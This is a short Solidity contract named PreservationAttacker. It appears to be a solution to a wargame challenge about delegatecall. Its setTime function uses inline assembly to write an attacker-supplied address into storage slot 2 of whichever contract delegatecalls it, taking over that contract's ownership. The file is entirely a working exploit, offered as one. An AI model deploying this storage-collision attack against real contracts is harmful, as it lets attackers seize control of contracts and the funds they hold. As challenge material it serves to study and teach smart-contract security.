// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttacker {
    function setTime(uint256 _timeStamp) public {
        address attacker = address(uint160(_timeStamp));
        assembly {
            sstore(2, attacker)
        }
    }
}
